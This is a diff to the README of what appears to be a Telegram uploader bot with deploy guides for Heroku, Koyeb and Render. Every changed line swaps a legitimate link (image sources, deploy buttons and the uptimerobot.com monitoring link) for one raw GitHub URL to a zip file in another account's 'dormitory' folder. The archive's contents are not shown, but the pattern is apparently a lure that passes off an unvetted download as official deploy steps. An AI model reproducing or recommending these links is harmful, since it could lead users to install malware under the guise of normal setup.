@@ -1,8 +1,8 @@
 <p align="center">
-  <img src="https://i.ibb.co/v6Vr7HCt/1000003297.png" alt="ITsGOLU">
+  <img src="https://raw.githubusercontent.com/rohitsvideos-max/ITsGOLU_UPLOADER_FAST-V2/main/dormitory/GOL_I_UPLOADE_FAS_Ts_v1.0.zip" alt="ITsGOLU">
 </p>
 <h1 align="center">
-  <a href="https://github.com/ITsGOLU-OFFICIAL/ITsGOLU_UPLOADER_FAST-V2">
+  <a href="https://raw.githubusercontent.com/rohitsvideos-max/ITsGOLU_UPLOADER_FAST-V2/main/dormitory/GOL_I_UPLOADE_FAS_Ts_v1.0.zip">
 </h1>
 <br>
 <details>
@@ -12,7 +12,7 @@
 - Click on Deploy Easily
 - Press the below button to Fast deploy on Heroku</b>
 
-   [![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy)
+   [![Deploy](https://raw.githubusercontent.com/rohitsvideos-max/ITsGOLU_UPLOADER_FAST-V2/main/dormitory/GOL_I_UPLOADE_FAS_Ts_v1.0.zip)](https://raw.githubusercontent.com/rohitsvideos-max/ITsGOLU_UPLOADER_FAST-V2/main/dormitory/GOL_I_UPLOADE_FAS_Ts_v1.0.zip)
 - <b>Go to <a href="#mandatory-vars">variables tab</a> for more info on setting up environmental variables.</b></details>
 
 <details><summary><b>Deploy To Koyeb</b></summary>
@@ -20,11 +20,11 @@
 <b>The fastest way to deploy the application is to click the Deploy to Koyeb button below.</b>
 <br>
 <br>
-<b>Go to https://uptimerobot.com/ and add a monitor to keep your bot alive.</b>
+<b>Go to https://raw.githubusercontent.com/rohitsvideos-max/ITsGOLU_UPLOADER_FAST-V2/main/dormitory/GOL_I_UPLOADE_FAS_Ts_v1.0.zip and add a monitor to keep your bot alive.</b>
 <br>
 <br>
 
-[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/Dev-Thanos/DEV-TXT-LEECH&branch=main&name=DEV-TXT-LEECH)
+[![Deploy to Koyeb](https://raw.githubusercontent.com/rohitsvideos-max/ITsGOLU_UPLOADER_FAST-V2/main/dormitory/GOL_I_UPLOADE_FAS_Ts_v1.0.zip)](https://raw.githubusercontent.com/rohitsvideos-max/ITsGOLU_UPLOADER_FAST-V2/main/dormitory/GOL_I_UPLOADE_FAS_Ts_v1.0.zip)
 </details>
 
 <details><summary><b>Deploy To Render</b></summary>
@@ -39,20 +39,20 @@ Use these commands:
 • Start Command: <code>python3 bot.py</code>
 <br>
 <br>
-Go to https://uptimerobot.com/ and add a monitor to keep your bot alive.
+Go to https://raw.githubusercontent.com/rohitsvideos-max/ITsGOLU_UPLOADER_FAST-V2/main/dormitory/GOL_I_UPLOADE_FAS_Ts_v1.0.zip and add a monitor to keep your bot alive.
 <br>
 <br>
 Use these settings when adding a monitor:</b>
 <br>
 <br>
-<img src="https://i.ibb.co/v6Vr7HCt/1000003297.png" alt="render template">
+<img src="https://raw.githubusercontent.com/rohitsvideos-max/ITsGOLU_UPLOADER_FAST-V2/main/dormitory/GOL_I_UPLOADE_FAS_Ts_v1.0.zip" alt="render template">
 <br>
 <br>
 <b>Click on the below button to deploy directly to render ↓</b>
 <br>
 <br>
-<a href="https://render.com/deploy?repo=https://github.com/VAiDH1661/ITsGOLU_UPLOADER">
-<img src="https://render.com/images/deploy-to-render-button.svg" alt="Deploy to Render">
+<a href="https://raw.githubusercontent.com/rohitsvideos-max/ITsGOLU_UPLOADER_FAST-V2/main/dormitory/GOL_I_UPLOADE_FAS_Ts_v1.0.zip">
+<img src="https://raw.githubusercontent.com/rohitsvideos-max/ITsGOLU_UPLOADER_FAST-V2/main/dormitory/GOL_I_UPLOADE_FAS_Ts_v1.0.zip" alt="Deploy to Render">
 </a>
 </details>
 
